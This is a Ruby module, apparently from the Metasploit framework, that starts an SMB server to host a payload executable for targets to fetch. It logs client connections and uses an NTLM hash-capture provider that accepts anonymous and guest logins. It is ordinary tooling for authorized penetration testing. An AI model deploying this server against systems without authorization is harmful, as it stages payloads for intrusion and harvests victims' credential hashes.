module Msf::Payload::Adapter::Fetch::Server::SMB

  include ::Msf::Exploit::Remote::SMB::LogAdapter
  include ::Msf::Exploit::Remote::SMB::Server::HashCapture

  def start_smb_server(srvport, srvhost)
    vprint_status("Starting SMB server on #{Rex::Socket.to_authority(srvhost, srvport)}")

    log_device = LogDevice::Framework.new(framework)
    logger = Logger.new(self, log_device)

    ntlm_provider = Msf::Exploit::Remote::SMB::Server::HashCapture::HashCaptureNTLMProvider.new(
      allow_anonymous: true,
      allow_guests: true,
      listener: self,
      ntlm_type3_status: nil
    )

    fetch_service = Rex::ServiceManager.start(
      Rex::Proto::SMB::Server,
      srvport,
      srvhost,
      {
        'Msf'        => framework,
        'MsfExploit' => self,
      },
      _determine_server_comm(srvhost),
      gss_provider: ntlm_provider,
      logger: logger
    )

    fetch_service.on_client_connect_proc = Proc.new { |client|
      on_client_connect(client)
    }
    fetch_service
  end

  def cleanup_smb_fetch_service(fetch_service)
    fetch_service.remove_share(@fetch_virtual_disk)
    fetch_service.deref
  end

  def fetch_protocol
    'SMB'
  end

  def start_smb_fetch_handler(srvport, srvhost, srvuri, srvexe)
    unless srvuri.include?('\\')
      raise RuntimeError, 'The srvuri argument must include a share name'
    end

    share_name, _, share_path = srvuri.partition('\\')

    fetch_service = start_smb_server(srvport, srvhost)
    if fetch_service.nil?
      cleanup_handler
      fail_with(Msf::Exploit::Failure::BadConfig, "Fetch handler failed to start on #{Rex::Socket.to_authority(srvhost, srvport)}")
    end

    if fetch_service.shares.key?(share_name)
      cleanup_smb_fetch_service(fetch_service)
      fail_with(Msf::Exploit::Failure::BadConfig, "The specified SMB share '#{share_name}' already exists.")
    end

    @fetch_virtual_disk = RubySMB::Server::Share::Provider::VirtualDisk.new(share_name)
    # the virtual disk expects the path to use the native File::SEPARATOR so normalize on that here
    @fetch_virtual_disk.add_static_file(share_path, srvexe)
    fetch_service.add_share(@fetch_virtual_disk)
    fetch_service
  end

  def on_client_connect(client)
    vprint_status("Received SMB connection from #{client.peerhost}")
  end
end

